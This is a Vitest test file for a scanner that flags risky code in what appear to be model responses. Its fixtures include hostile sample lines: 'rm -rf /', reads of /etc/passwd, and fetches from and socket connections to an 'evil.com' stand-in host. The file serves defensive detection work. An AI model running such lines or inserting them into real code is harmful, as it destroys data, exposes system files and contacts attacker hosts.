import { describe, it, expect } from "vitest";
import { scanOutput } from "@/lib/scan-output";

describe("scanOutput", () => {
  it("returns no warnings for clean code", () => {
    const response = `\`\`\`python
import torch
import numpy as np

model = torch.nn.Linear(10, 5)
x = torch.randn(3, 10)
output = model(x)
print(output.shape)
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings).toHaveLength(0);
  });

  it("flags os.system() calls", () => {
    const response = `\`\`\`python
import os
os.system("rm -rf /")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.warnings.some((w) => w.includes("os.system"))).toBe(true);
  });

  it("flags subprocess usage", () => {
    const response = `\`\`\`python
import subprocess
subprocess.run(["ls", "-la"])
subprocess.call("whoami", shell=True)
subprocess.Popen(["cat", "/etc/passwd"])
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("subprocess"))).toBe(true);
  });

  it("flags eval() and exec()", () => {
    const response = `\`\`\`python
user_input = "print('hello')"
eval(user_input)
exec(user_input)
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("eval("))).toBe(true);
    expect(result.warnings.some((w) => w.includes("exec("))).toBe(true);
  });

  it("flags __import__ usage", () => {
    const response = `\`\`\`python
mod = __import__("os")
mod.system("whoami")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("__import__"))).toBe(true);
  });

  it("flags network access via requests", () => {
    const response = `\`\`\`python
import requests
data = requests.get("https://evil.com/payload")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.toLowerCase().includes("requests"))).toBe(true);
  });

  it("flags urllib usage", () => {
    const response = `\`\`\`python
import urllib.request
urllib.request.urlopen("https://evil.com")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("urllib"))).toBe(true);
  });

  it("flags socket usage", () => {
    const response = `\`\`\`python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.com", 4444))
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("socket"))).toBe(true);
  });

  it("flags suspicious file operations", () => {
    const response = `\`\`\`python
with open("/etc/passwd", "r") as f:
    print(f.read())
os.remove("/important/file")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("/etc/"))).toBe(true);
  });

  it("flags long base64 strings", () => {
    const longB64 = "A".repeat(120);
    const response = `\`\`\`python
payload = "${longB64}"
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.toLowerCase().includes("base64"))).toBe(true);
  });

  it("does not flag short base64-like strings", () => {
    const response = `\`\`\`python
token = "abc123"
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings).toHaveLength(0);
  });

  it("flags http.client usage", () => {
    const response = `\`\`\`python
import http.client
conn = http.client.HTTPSConnection("evil.com")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings.some((w) => w.includes("http.client"))).toBe(true);
  });

  it("handles empty response", () => {
    const result = scanOutput("");
    expect(result.warnings).toHaveLength(0);
  });

  it("only scans code blocks, not markdown", () => {
    const response = `\`\`\`markdown
This text mentions os.system() but it's in markdown, not code.
eval() and exec() are just words here.
\`\`\`

\`\`\`python
import torch
x = torch.randn(10)
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings).toHaveLength(0);
  });

  it("includes line context in warnings", () => {
    const response = `\`\`\`python
import os
os.system("whoami")
\`\`\``;
    const result = scanOutput(response);
    expect(result.warnings[0]).toContain("os.system");
  });
});
